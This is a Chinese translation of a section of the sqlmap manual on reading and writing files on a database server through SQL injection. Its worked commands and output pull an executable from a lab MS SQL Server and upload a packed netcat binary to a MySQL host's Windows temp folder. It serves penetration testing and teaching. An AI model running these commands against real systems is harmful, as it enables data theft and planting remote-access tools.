# 访问文件系统

## 读取数据库服务器文件系统文件

选项：`--file-read`

当后端 DBMS（Database Management System，数据库管理系统）为 MySQL，PostgreSQL 或者 Microsoft SQL Server，并且当前会话用户拥有利用数据库特定功能和相关架构弱点的权限时，sqlmap 能够直接读取底层文件系统中文件的内容。文件可以是文本文件或者二进制文件，sqlmap 都能够正确地处理相关文件。

这些技术的相关详情可见白皮书[通过高级 SQL 注入完全控制操作系统](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857)。

下面是以 Microsoft SQL Server 2005 为目标，获取二进制文件的例子：

```shell
$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?nam\
e=luther" --file-read "C:/example.exe" -v 1

[...]
[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2000
web application technology: ASP.NET, Microsoft IIS 6.0, ASP
back-end DBMS: Microsoft SQL Server 2005

[hh:mm:50] [INFO] fetching file: 'C:/example.exe'
[hh:mm:50] [INFO] the SQL query provided returns 3 entries
C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/
C__example.exe'
[...]

$ ls -l output/192.168.136.129/files/C__example.exe 
-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C_
_example.exe

$ file output/192.168.136.129/files/C__example.exe 
output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI
) Intel 80386 32-bit
```

## 向数据库服务器的文件系统上传文件

选项：`--file-write` 和 `--file-dest`

当后端 DBMS 为 MySQL，PostgreSQL 或者 Microsoft SQL Server，并且当前会话用户拥有利用数据库特定功能和相关架构弱点的权限时，sqlmap 能够向数据库服务器文件系统上传一个本地文件。文件可以是文本文件或者二进制文件，sqlmap 都能够正确地处理相关文件。

这些技术的相关详情可见白皮书[通过高级 SQL 注入完全控制操作系统](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857)。

下面是以 MySQL 为目标，向服务器提交一个经过 UPX 压缩的二进制文件的例子：

```shell
$ file /software/nc.exe.packed
/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32
-bit

$ ls -l /software/nc.exe.packed
-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed

$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" -\
-file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1

[...]
[hh:mm:29] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003 or 2008
web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
back-end DBMS: MySQL >= 5.0.0

[...]
do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been success
fully written on the back-end DBMS file system? [Y/n] y
[hh:mm:52] [INFO] retrieved: 31744
[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 b
ytes, same size as the local file '/software/nc.exe.packed'
```
